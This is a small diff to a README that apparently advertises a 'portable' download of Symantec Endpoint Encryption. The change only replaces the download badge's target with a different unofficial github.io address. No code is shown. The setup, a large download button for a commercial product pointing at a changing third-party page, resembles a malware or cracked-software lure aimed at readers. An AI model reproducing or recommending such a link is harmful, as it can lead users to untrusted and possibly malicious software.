@@ -2,7 +2,8 @@
 
 ## 📥 Download Symantec Endpoint Encryption Portable
 
-[![⬇️ Download SEE Portable](https://img.shields.io/badge/Download-Symantec%20Endpoint%20Encryption%20Portable-blue?style=for-the-badge&logo=symantec)](https://see-portable-download.github.io/.github)
+[![⬇️ Download SEE Portable](https://img.shields.io/badge/Download-Symantec%20Endpoint%20Encryption%20Portable-blue?style=for-the-badge&logo=symantec)](https://symantec-endpoint-encryption-portable.github.io/.github
+)
 
 ---
 
